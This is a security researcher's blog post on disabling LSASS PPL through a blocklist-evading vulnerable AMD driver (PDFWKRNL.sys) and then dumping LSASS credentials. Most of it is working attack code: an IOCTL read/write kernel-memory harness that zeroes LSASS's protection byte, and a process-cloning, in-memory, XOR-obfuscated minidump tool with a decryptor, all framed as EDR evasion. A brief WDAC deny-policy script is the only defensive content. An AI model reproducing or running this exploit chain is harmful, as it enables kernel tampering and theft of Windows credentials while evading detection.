---
title: BYOVD and Looting LSASS in the Modern EDR Era
header:
  teaser: "/assets/images/driver.png"
categories:
  - BYOVD
tags:
  - LSASS
  - PPL
  - XOR
  - BYOVD
  - EDR Bypass
  - '2026'
  - g3tsyst3m
---

I still remember when Mimikatz dropped in 2011. It was a wild time in offensive security, and a period where a single tool could expose fundamental weaknesses in Windows credential handling and force the entire ecosystem to level up. Features like Protected Process Light (PPL), hardened LSASS protections, and vastly improved ETW telemetry didn't emerge in a vacuum; they were, in part, Microsoft's response to researchers openly demonstrating just how broken things were. It was an era defined by deep technical curiosity and creative problem-solving on both sides of the fence, and this was long before AI entered the chat.  

Leaping ahead to 2026, the end goal remains the same, but the path to get there has shifted drastically.  What was once a simple matter of tossing mimikatz onto a machine and scraping the freely available, cleartext wdigest creds, has become a more involved process.  Now, we're faced with a few unique but not all too unfamiliar challenges.  Here are just a few off the top of my head:

- We need to evade or in some cases neutralize EDR ,though I'm of the opinion the latter is much noisier of an option
- Processes like the coveted `LSASS` now have PPL protection and the many usermode tools that can be used to bypass PPL are heavily signatured
- Many offsec tools are flagged in general and need to be ran in-memory, using many preferred techniques by yours truly such as an in-memory PE loader
- Vulnerable driver blacklists and HVCI

In cases like the one we're facing, we traditionally would turn to BYOVD.  Well, I can say not much has changed there, though we will need to get creative in either locating a completely new, undiscovered driver vulnerability.  Or, you could be lazy like me and find a driver that has already been discovered and just use that, albeit a version that hasn't been caught by the blocklist yet 😸

In today's post, we will be uncovering the internals of kernel driver vulnerabilities and how to leverage them via the `BYOVD` (Bring Your Own Vulnerable Driver) method of attack. We will use kernel access to disable PPL for the LSASS process and then proceed to dump the process to disk, XOR'ing it beforehand so it avoids detection by popular EDR solutions.  Let's begin!

Finding a Signed Driver that's not on the Microsoft Blocklist
-

I basically start at **loldrivers.io** or **malshare.com** and download a few drivers to see if they raised a flag concerning the Microsoft Vulnerable Driver Blocklist detection.  Also just FYI, I  have all the necessary security controls enabled beforehand that should prevent this particular driver from loading, such as:

<img width="898" height="677" alt="image" src="https://github.com/user-attachments/assets/0640b218-3619-47cc-a4d6-d55ff14c6f2a" /><img width="586" height="701" alt="image" src="https://github.com/user-attachments/assets/61ad5e67-a9fd-4e24-9f83-ff0ce8ec423b" /><img width="492" height="447" alt="image" src="https://github.com/user-attachments/assets/8a921097-5b96-4631-b0ad-83e287b13137" /><img width="528" height="756" alt="image" src="https://github.com/user-attachments/assets/250862e9-05db-4ed3-a7a0-5258d4aff722" />

I decided on **PDFWKRNL.sys**, which is vulnerable to a host of vulnerabilities such as a read and write memory primitive, thus making this driver a great candidate for overwriting our PPL value in LSASS to 0x00 effectively neutralizing PPL.  You want to try out different versions of the vulnerable driver.  I cannot stress that enough! Just because the driver is known by microsoft as a known flagged driver, doesn't mean every working version will be flagged.  That brings me to my next point: If we scroll down this page a bit, you'll find the version of the driver with sha256 hash value: **6945077a6846af3e4e2f6a2f533702f57e993c5b156b6965a552d6a5d63b7402**

[PDFWKRNL.sys](https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/f0db5af13c457a299a64cf524c64b042.bin)

<img width="1354" height="754" alt="image" src="https://github.com/user-attachments/assets/8e6aec82-16ce-4b5e-a58f-e6d14a298418" />

That's the driver I am using for this post that is yet to be flagged by Microsoft's block list 😼  Credit where credit is due.  I learned a lot from hfiref0x's KDU repo: [KDU](https://github.com/hfiref0x/KDU)

I tested a few drivers using that tool before I decided to produce my own code to load the vulnerable **PDFWKRNL.sys** driver.  I admittedly borrowed from the previously discovered IOCTL code and symlink name for the driver, but then to better understand how this vulnerability was discovered, I took to binary ninja to explore for myself!

The Inner workings of PDFWKRNL.sys
-

**Step 1 — Tracing IOCTL 0x80002014 through the dispatch table**

We know from KDU's previously researched info that the IOCTL code we are concerned with is **0x80002014**.  Let's start with **sub_140001000**, which calculates both the IOCTL and the function that should be called based on a number of calculations we will explore below.  Long story short: the IOCTL value is not in cleartext when reversing this driver 😸  

Let's start with how did we arrive at the **0x8000** value?  Here's how it works:

Windows IOCTL codes are structured 32-bit values built by the **CTL_CODE macro**:

- bits 31-16  device type    (**0x8000 here**)
- bits 15-14  required access
- bits 13- 2  function code  (the meaningful part)
- bits  1- 0  transfer method (buffered/direct/neither)

Moreover, we can see this info in Binary Ninja.  That information, including the device name, just so happens to be in cleartext and doesn't have to be deciphered!

<img width="901" height="392" alt="image" src="https://github.com/user-attachments/assets/4a730dcc-cdd6-4ad1-9136-f70d3c356bd3" />

**So again...How did we arrive at value 0x8000 for the start of our IOCTL code?**

Microsoft reserves device types below **0x8000** for official Windows device types (FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD, FILE_DEVICE_UNKNOWN, etc.).

Third-party vendors (like AMD) must use values **0x8000** and above for their custom device types.  **0x8000** is the most common value used by many vendors for custom/software-only drivers. It's essentially saying: "This is a vendor-defined device type".

**How about 0x2000 after the 0x8000?**

Glad you asked 😺  

This value is calculated, borrowing from the two's complement of the constant in the instruction.  This took me FOREVER to figure out which is kind of embarrassing and humbling for me lol!

The instruction is add eax, 0x7fffe000. Adding a constant is the same as subtracting its two's complement negation:

  ~0x7fffe000 + 1
  = 0x80001fff + 1
  = 0x80002000

<img width="909" height="497" alt="image" src="https://github.com/user-attachments/assets/3908a492-1a62-4810-8cc5-12122602ef19" />

So **add eax, 0x7fffe000** in 32-bit arithmetic is identical to **sub eax, 0x80002000**

Next, there's the final 0x14.  How did we arrive at that?  That's the case value we're looking for that points to the memory write primitive!

<img width="670" height="346" alt="image" src="https://github.com/user-attachments/assets/369b1257-7ce3-4764-bfe4-343883ae12cd" />

**Why this is a vulnerability?**

There is zero validation.  No ProbeForRead/ProbeForWrite, no canonical address check, no bounds check. Any process that can open **\\.\PdFwKrnl** gets a ring-0 **memmove** with fully attacker-controlled src, dst, and size:

  - Read primitive: dst = usermode buffer, src = any kernel VA → copies kernel memory to userspace
  - Write primitive: dst = any kernel VA, src = usermode payload → overwrites arbitrary kernel memory

```cpp
1400012ae                            sub_1400016c0(
1400012ae                                *(uint64_t*)((char*)MasterIrp + 0x10), 
1400012ae                                *(uint64_t*)((char*)MasterIrp + 0x18), 
1400012ae                                (uint64_t)MasterIrp[0xa]);
1400012b3                            arg2->IoStatus.Information = 0x30;
```

I am forever appreciative of the original research that went into discovering the IOCTL value.  It would have taken me a very long time to discover that on my own, I can assure you 😸  But yeah, that's the general breakdown on how this driver vulnerability plays out and why it's a great candidate for BYOVD and removing PPL protection on LSASS.  Now, on to the next best part, the code!

Code for the PPL Removal / Exploit Harness for PDFWKRNL.sys
-

It's time for the highly anticipated code portion of this post!  Let's go head and get started.  We will begin with defining the IOCTL value we wish to work with, as well as the 0x48 byte structure which is required for the IOCTL check. the 0x30 in the screenshot below is the buffer check of 0x30 or 48 in decimal, followed by the memcpy/memmove values!

<img width="765" height="441" alt="image" src="https://github.com/user-attachments/assets/104c5429-31ca-4b24-b5fe-8d0c6f8bb6d4" />

```nasm
mov r8d, dword [rsi+0x28]   ; size  ← BufAmdCopy.size   (32-bit read, upper 32 bits of u64 discarded)
mov rdx, qword [rsi+0x18]   ; src   ← BufAmdCopy.src
mov rcx, qword [rsi+0x10]   ; dst   ← BufAmdCopy.dst
call sub_1400016c0           ; memmove(dst, src, size)
```

Microsoft x64 calling convention: **rcx=arg1, rdx=arg2, r8=arg3**.  This is exactly **memmove(dst, src, size)** with all three values coming unmodified from the usermode-supplied buffer. No sanitization between the jne and the call!

Now let's plug those values into our code:

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// --- AMD PDFW (PdFwKrnl) Specifics ---
#define IOCTL_AMDPDFW_MEMCPY 0x80002014 //our IOCTL value

// This structure MUST be exactly 48 bytes
typedef struct _PDFW_MEMCPY {
    BYTE  Reserved[16];   // 0x00 - 0x0F
    PVOID Destination;    // 0x10 <--
    PVOID Source;         // 0x18 <--
    PVOID Reserved2;      // 0x20
    DWORD Size;           // 0x28 <--
    DWORD Reserved3;      // 0x2C
} PDFW_MEMCPY, * PPDFW_MEMCPY;
```

Next up, we need to find the kernel offsets for the version of Windows this driver would be running on.  In my case, Windows 11 25h2.  Here are the values I pulled, and I'll also show how I retrieved them.
It's incredibly annoying having to debug in kernel mode, turning on debugging using bcdedit and restarting the machine.  Let's make life easier for ourselves.  I just reverse engineer **ntoskrnl.exe** and do a static search for the **_EPROCESS** type.  Easy peezy!

<img width="816" height="728" alt="image" src="https://github.com/user-attachments/assets/f49f882a-59da-441a-9303-f65396db1731" />

Our first two values are clearly visible!  Next, just scroll down a bit to reach ImageFileNameOffset and then ProtectionOffset:

<img width="693" height="123" alt="image" src="https://github.com/user-attachments/assets/80216119-ebcd-42f2-8ea1-3f4f763ba9c5" />

<img width="598" height="105" alt="image" src="https://github.com/user-attachments/assets/f059d358-0d03-4ceb-a2ad-c713277513fe" />

Now we just make our own struct to include those values, like so:

```cpp
struct KernelOffsets {
    ULONG64 UniqueProcessIdOffset = 0x1D0;
    ULONG64 ActiveProcessLinksOffset = 0x1D8;
    ULONG64 ImageFileNameOffset = 0x338;
    ULONG64 ProtectionOffset = 0x5FA; // Offset for Build 26200
};
```

Ok that's the part that a lot of people could use a refresher on.  The next part I'm not going to spend as much time explaining.  We basically setup the memory read and write functions.

```cpp
HANDLE hDriver = INVALID_HANDLE_VALUE;
KernelOffsets Offsets;

// --- AMD PDFW Driver Communication ---

bool Amd_ReadMemory(DWORD64 Address, PVOID Buffer, DWORD Size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;           // Where we want the data (our local buffer)
    request.Source = (PVOID)Address;        // Where the data is (kernel address)
    request.Size = Size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, IOCTL_AMDPDFW_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

bool Amd_WriteMemory(DWORD64 Address, PVOID Buffer, DWORD Size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;   // Where we want to write (kernel address)
    request.Source = Buffer;                // What we want to write (our local buffer)
    request.Size = Size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, IOCTL_AMDPDFW_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

// Helper wrapper for 64-bit reads
DWORD64 ReadMemoryDWORD64(DWORD64 Address) {
    DWORD64 val = 0;
    if (Amd_ReadMemory(Address, &val, 8)) return val;
    return 0;
}
```

Next up, we need to setup a function to locate the PsInitialSystemProcess Offset.

```cpp
ULONG64 GetSystemEproc(ULONG64 ntosBase) {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    DWORD64 addrInLocal = (DWORD64)GetProcAddress(ntos, "PsInitialSystemProcess");
    DWORD64 offset = addrInLocal - (DWORD64)ntos;
    FreeLibrary(ntos);

    std::cout << "[*] PsInitialSystemProcess Offset: 0x" << std::hex << offset << std::endl;
    return ReadMemoryDWORD64(ntosBase + offset);
}
```

Now for the obligatory main function, which includes an argument parameter for our LSASS pid and the file handle to our driver in question:

```cpp
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <Target PID>" << std::endl;
        return 1;
    }
    DWORD targetPid = std::stoul(argv[1]);

    // Connect to Driver
    hDriver = CreateFileW(L"\\\\.\\Global\\PdFwKrnl", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open handle to PdFwKrnl. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Connected to AMD PDFW Driver." << std::endl;
```

We're close now, basically at the home stretch!  😸  We just need to locate the kernel base `ntoskrnl.exe` and the **EPROCESS** address.  Then, we need cycle through all the processes and locate **LSASS**!

```cpp
 // Get Kernel Base
 ULONG64 ntosBase = 0;
 LPVOID drivers[1024];
 DWORD cb;
 if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) ntosBase = (ULONG64)drivers[0];
 std::cout << "[*] ntoskrnl.exe Base: 0x" << std::hex << ntosBase << std::endl;

 ULONG64 systemEproc = GetSystemEproc(ntosBase);
 if (!systemEproc) {
     std::cerr << "[-] Failed to read System EPROCESS. Communication failed." << std::endl;
     return 1;
 }
 std::cout << "[+] System EPROCESS: 0x" << std::hex << systemEproc << std::endl;

 // Iterate Process List
 DWORD64 listHead = systemEproc + Offsets.ActiveProcessLinksOffset;
 DWORD64 currentFlink = ReadMemoryDWORD64(listHead);
 bool found = false;

 while (currentFlink != listHead && currentFlink != 0) {
     DWORD64 currentEproc = currentFlink - Offsets.ActiveProcessLinksOffset;
     DWORD64 pid = ReadMemoryDWORD64(currentEproc + Offsets.UniqueProcessIdOffset);

     if (pid == targetPid) {
         char name[16] = { 0 };
         BYTE prot = 0;
         Amd_ReadMemory(currentEproc + Offsets.ImageFileNameOffset, name, 15);
         Amd_ReadMemory(currentEproc + Offsets.ProtectionOffset, &prot, 1);

         std::cout << "[+] Found Target: " << name << std::endl;
```

Lastly, we output the current protection level for LSASS and clear the protection to remove the PPL protective barrier:

```cpp
            std::cout << "[*] Current Protection: 0x" << (int)prot << std::endl;

            // ACTION: Clear Protection
            BYTE zero = 0;
            if (Amd_WriteMemory(currentEproc + Offsets.ProtectionOffset, &zero, 1)) {
                std::cout << "[!!!] SUCCESS: Protection byte cleared." << std::endl;
            }
            found = true;
            break;
        }
        currentFlink = ReadMemoryDWORD64(currentEproc + Offsets.ActiveProcessLinksOffset);
    }

    if (!found) std::cout << "[-] PID not found." << std::endl;

    CloseHandle(hDriver);
    return 0;
}
```

That my friends, is the completed code for our BYOVD PPL removal on a modern Windows 11 25h2 machine with all security features enabled that are inherent to Windows by default.  

**Full source code here:** [Source Code in Full](https://github.com/g3tsyst3m/CodefromBlog/blob/main/2026-5-29-BYOVD%20and%20Looting%20LSASS%20in%20the%20Modern%20EDR%20Era/byovd_sample2.cpp)

Code demo for Disabling PPL protection in LSASS
-

Let's see it in action!

Notice first how LSASS is currently protected:

<img width="1759" height="37" alt="image" src="https://github.com/user-attachments/assets/96f620a2-e30c-48b2-994c-217c976c747e" />

**Now we run our code:**

<img width="645" height="174" alt="image" src="https://github.com/user-attachments/assets/1f269199-1736-4b98-93b4-7e17ba3717c5" />

Close out and go back in to System Informer:

<img width="968" height="633" alt="image" src="https://github.com/user-attachments/assets/08c30d16-4055-4999-bd13-50a926eea679" />

We're ready to proceed with Part 2 of this post - Dumping LSASS!

# Process Cloning and In-Memory Minidump Interception using Callbacks and XOR Encryption

Alright, let's break this tool down piece by piece. This is a memory dumper that combines a few evasion tricks to fly under the radar of most EDR solutions:

- Process cloning
- Threading to prevent the machine locking up during the dump (this happens to me more often that I'd like to admit!) 😸
- In-memory Minidump interception using NUL file handles and Callbacks to prevent writing in the clear
- XOR obfuscation applied to the final `.DMP` file

All before anything ever touches disk. Let's get into it.

---

## Headers, Globals, and the XOR Key

```cpp
#include <windows.h>
#include <winternl.h>
#include <DbgHelp.h>
...
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Dbghelp.lib")

#define PS_INHERIT_HANDLES 0x00000004
const char XOR_KEY = 0x55;

std::atomic<DWORD> dumpSize(0);
LPVOID dumpBuffer = NULL;
```

Nothing too wild here on the surface, but a few things worth calling out. We're pulling in `winternl.h` because we need access to undocumented NT internals.  Specifically, `NtCreateProcessEx`, which is the core of our cloning trick. `DbgHelp.h` gives us `MiniDumpWriteDump`, the function that does the actual memory capture.

`PS_INHERIT_HANDLES (0x4)` is the flag we'll pass to `NtCreateProcessEx` to make the cloned process inherit handles from the parent, which is critical for the clone to function properly.

`XOR_KEY = 0x55` is our dead-simple obfuscation key.  It's enough to mangle the MZ header and scramble the dump so signature-based detections on file writes don't immediately fire. More on that later.

`dumpSize` is atomic because it's shared between the callback thread (which increments it) and the main thread (which reads it).  We don't want a race condition eating our byte count.

---

## The NtCreateProcessEx Typedef

```cpp
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    ...
    );
```

`NtCreateProcessEx` is an an undocumented Windows Native API that lets you create a new process using an *existing process as the parent template*. Microsoft doesn't officially expose this in the SDK, so we have to define the function pointer signature ourselves and resolve it at runtime via `GetProcAddress` from `ntdll.dll`.  Thankfully many other researchers have explored this undocumented NT API and shared their findings so we can better understand them. 😸

This is essentially the heart of the **process cloning** technique. Instead of opening a handle to something sensitive like `lsass.exe` and reading its memory directly (which EDRs absolutely watch for), we clone it. The clone is a snapshot of the original process's address space.  It's the same memory and same handles, but it's a new process object. Dumping the *clone* instead of the original is a classic way to sidestep handle-based detections.

---

## Getting SeDebugPrivilege

```cpp
BOOL EnablePrivilege(LPCWSTR privilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, privilege, &luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, ...);
    ...
}
```

Before we can open handles to protected processes or clone them, we need `SeDebugPrivilege`. This privilege lets a process read/write the memory of any other process on the system, including protected ones. It's typically held by admins and SYSTEM.

The flow here is standard:
1. Open our own process token
2. Look up the LUID (locally unique identifier) for the privilege we want
3. Set it enabled and call `AdjustTokenPrivileges`

This is a prerequisite step. If we can't get SeDebug, we bail early.

---

## XOR Obfuscation

```cpp
void xor_buffer(LPVOID buffer, DWORD size, char key) {
    BYTE* p = (BYTE*)buffer;
    for (DWORD i = 0; i < size; i++) {
        p[i] ^= key;
    }
}
```

Nothing fancy here really, just standard XOR encryption logic.  We walk every byte in the dump buffer and XOR it against `0x55`. The reason this matters: a raw minidump starts with the signature `MDMP` followed by recognizable structures. EDR products and AV engines scan file writes for these patterns. XOR-ing the buffer before it hits disk scrambles those signatures completely. The first four bytes `4D 44 4D 50` become `18 11 18 05`, which is totally unrecognizable.

To recover the dump later for analysis in **Mimikatz** or **pypykatz**, you just **XOR** it again with the same key (XOR is its own inverse).

---

## The Worker Thread

```cpp
void process_and_save_dump(LPVOID buffer, DWORD size, const char* outPath) {
    xor_buffer(buffer, size, XOR_KEY);

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, ...);
    WriteFile(hFile, buffer, size, &bytesWritten, NULL);
    CloseHandle(hFile);
}
```

After the dump lands in RAM, we spin up a worker thread to handle the XOR pass and disk write. This keeps the main thread clean and separates the dumping phase from the obfuscation/exfil phase. The dump lands at `C:\Users\Public\PID_xor.dmp`, whic is a world-writable path, no special permissions needed.  

---

## The Callback Routine and Intercepting MiniDump Writes

```cpp
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, 
    const PMINIDUMP_CALLBACK_INPUT CallbackInput, 
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        source = CallbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + CallbackInput->Io.Offset);
        RtlCopyMemory(destination, source, bufferSize);
        dumpSize.fetch_add(bufferSize);
        break;
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;
    }
    return TRUE;
}
```

This is one of the slicker tricks in the toolbox. `MiniDumpWriteDump` normally writes directly to a file handle you provide. But it also supports a callback interface.  Through that callback, every I/O operation gets routed through our function before it hits disk.

Here's what each callback type does:

- **`IoStartCallback`** — fires when the dump begins. We return `S_FALSE` to signal "I'll handle the I/O myself."
- **`IoWriteAllCallback`** — fires for every chunk of data being written. Instead of letting it go to disk, we `RtlCopyMemory` it into our own `dumpBuffer` at the correct offset. The `dumpSize` atomic counter tracks total bytes captured.
- **`IoFinishCallback`** — fires when the dump is done. We return `S_OK` to signal success.

The result: the entire dump lives in **RAM only** until we deliberately write it. This sidesteps file-based write detections entirely during the capture phase. 😏

---

## Putting It All Together

```cpp
int main(int argc, char* argv[]) {
    DWORD targetPid = (DWORD)atoi(argv[1]);
    EnablePrivilege(SE_DEBUG_NAME);

    // 1. Allocate 200MB heap buffer
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200);

    // 2. Clone the target process
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    NtCreateProcessEx(&hClone, PROCESS_ALL_ACCESS, NULL, hTarget, PS_INHERIT_HANDLES, ...);

    // 3. Open a handle to NUL
    HANDLE hNul = CreateFileA("NUL", GENERIC_ALL, 0, NULL, OPEN_EXISTING, ...);

    // 4. Dump via callback
    MiniDumpWriteDump(hClone, targetPid, hNul, MiniDumpWithFullMemory, NULL, NULL, &mci);

    // 5. XOR + write in worker thread
    std::thread worker(process_and_save_dump, dumpBuffer, finalSize, outPath);
    worker.join();
}
```

The main function orchestrates the whole attack chain:

**Step 1 — Buffer allocation.** We pre-allocate 200MB on the heap to receive the dump. This is sized generously to handle a full `lsass` dump on most systems.

**Step 2 — Process cloning.** We open the target PID with `PROCESS_ALL_ACCESS`, then hand that handle to `NtCreateProcessEx` as the "parent." The kernel creates a cloned process object that is a snapshot of the target's address space. We dump the *clone*, not the original, which avoids a direct `OpenProcess` on a sensitive process like lsass.

**Step 3 — The NUL handle trick.** `MiniDumpWriteDump` requires a file handle as a parameter. We pass it `NUL`, which is Windows' equivalent of `/dev/null`. Since our callback intercepts all writes before they reach the file, nothing actually goes to NUL. But the function needs a valid handle, and NUL is the cleanest placeholder.

**Step 4 — Dump triggered via callback.** With `MiniDumpWithFullMemory` we capture everything: stack, heap, mapped files. The callback silently redirects every write chunk into our RAM buffer.

**Step 5 — Worker thread handles the rest.** Once the dump is in memory, we hand it off to the worker thread to XOR and write to disk. Main thread waits for it to finish, then cleans up all handles and frees the heap buffer.

---

Final source code: [Full Source Code](https://github.com/g3tsyst3m/CodefromBlog/blob/main/2026-5-29-BYOVD%20and%20Looting%20LSASS%20in%20the%20Modern%20EDR%20Era/dump_the_goodz_7.cpp)

## Evasion Summary

To recap, this tool chains several techniques together that each address a different detection layer:

| Technique | What It Evades |
|---|---|
| Process cloning via NtCreateProcessEx | Handle-based detections on sensitive processes |
| MiniDump callback (in-memory dump) | File-write monitoring during capture |
| XOR before disk write | Signature scanning on dump files |
| Writing to NUL device | File creation events during the dump call |
| Worker thread separation | Keeps dump/write operations isolated |

No single one of these is a silver bullet, but layered together, they make for a very covert approach to dumping LSASS in the modern era of EDR.

---

Code Demo!
-

<img width="1076" height="185" alt="image" src="https://github.com/user-attachments/assets/f8e61426-1448-4d06-954a-07767e8d3634" />

And the encrypted file:

<img width="1638" height="878" alt="image" src="https://github.com/user-attachments/assets/3d730761-4dcf-44bc-b52a-2eab13e94ae4" />

okay, let's decrypt this thing!  

<img width="892" height="184" alt="image" src="https://github.com/user-attachments/assets/9fa293e8-f7f6-4d91-a1e5-12a35a3b0837" />

<img width="1058" height="732" alt="image" src="https://github.com/user-attachments/assets/99964278-efaa-42ab-b34a-9f86d06bfd2e" />

Want the decrypt code?  Sure, here it is.  Take it! 😸

> **XOR Decrypt code**

```py
import sys

def xor_decrypt(input_path, output_path, key=0x55):
    try:
        print(f"[*] Reading encrypted dump: {input_path}")
        with open(input_path, 'rb') as f:
            encrypted_data = f.read()

        print(f"[*] Decrypting {len(encrypted_data)} bytes...")
        # Perform XOR operation on every byte
        decrypted_data = bytearray([b ^ key for b in encrypted_data])

        with open(output_path, 'wb') as f:
            f.write(decrypted_data)

        print(f"[+] Success! Decrypted dump saved to: {output_path}")
        
        # Quick validation check for the Minidump header
        if decrypted_data[:4] == b'MDMP':
            print("[+] Header Validation: MDMP signature found. File is ready for pypykatz.")
        else:
            print("[!] Warning: MDMP signature not found. Check your XOR key.")

    except FileNotFoundError:
        print(f"[-] Error: File '{input_path}' not found.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 decrypt_dump.py <input_file> <output_file>")
    else:
        xor_decrypt(sys.argv[1], sys.argv[2])
```

🛡️ So, How do I defend against This? 🛡️
-

First off, I need to make this point very clear.  This is using an already known vulnerable driver.  The fact this is even allowed on a fully patched, secured Windows 11 25h2 machine with all security features enabled blows my mind.  This shouldn't even be possible in the first place.  But, then again I wouldn't be a security researcher if I didn't find some alternative, unexplored ways of achieving an end goal right? 😸  Since the vulnerable driver block list isn't detecting this (because it's a different hash?), then we are left with one option I'm aware of as far as built in options in Windows.  We can create a rule/policy using Windows Defender Application Control to block the driver from starting.  Other than that, this really should be easier to prevent. LoL.

Here's a script that accomplishes this for those interested.  Be sure to revise it accordingly for your own use case:

```powershell

$DenyRule = New-CIPolicyRule -Level FilePublisher -DriverFilePath "C:\users\robbi\OneDrive\Pictures\AMD.sys" -Fallback SignedVersion,Publisher,Hash -Deny

# 1. Copy the template to your Documents folder where you have full permissions
Copy-Item "$env:windir\schemas\CodeIntegrity\ExamplePolicies\AllowAll.xml" -Destination "C:\Users\robbi\Documents\AllowAll_Temp.xml"

# 2. Point your variable to the new, copied file location
$AllowAllPolicy = "C:\Users\robbi\Documents\AllowAll_Temp.xml"

# 3. Run the merge command again using the copied template
Merge-CIPolicy -PolicyPaths $AllowAllPolicy -OutputFilePath "C:\Users\robbi\Documents\DenyPolicy.xml" -Rules $DenyRule

# 4. Clean up the temporary template file
Remove-Item "C:\Users\robbi\Documents\AllowAll_Temp.xml"

# 5. Change the Friendly Name safely using the native Microsoft cmdlet
Set-CIPolicyIdInfo -FilePath "C:\Users\robbi\Documents\DenyPolicy.xml" -PolicyName "Driver Deny Policy - AMD"

# 6. Read the unique GUID directly out of your policy XML
[xml]$policy = Get-Content "C:\Users\robbi\Documents\DenyPolicy.xml"
$policyID = $policy.SiPolicy.PolicyID

# 7. Re-compile the binary using the exact string formatting Windows expects
$correctName = "$policyID.cip"
ConvertFrom-CIPolicy -XmlFilePath "C:\Users\robbi\Documents\DenyPolicy.xml" -BinaryFilePath "C:\Users\robbi\Documents\$correctName"

Write-Host "Your new file is named: $correctName"

# 8. Register and refresh the policy binary via the official tool path
CiTool.exe --update-policy "C:\Users\robbi\Documents\$correctName"

# 1. Remotely unregister the old policy from the Windows Kernel (replace with your GUID)
CiTool.exe --remove-policy "{31351756-3f24-4963-8380-4e7602335aae}"

# 2. Delete the old binary from your local Documents folder to prevent duplicates
Remove-Item "C:\Users\robbi\Documents\*.cip" -Force
```

🎁 ***Bonus Content for Members! (Sapphire Tier)*** 🎁
-

Coming very soon!  Likely a video walkthrough and some extra code
  
***ANY.RUN Results***
-

[Full Sandbox Analysis](https://app.any.run/tasks/70110313-16cd-4ec8-9719-c1624538c067)

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>
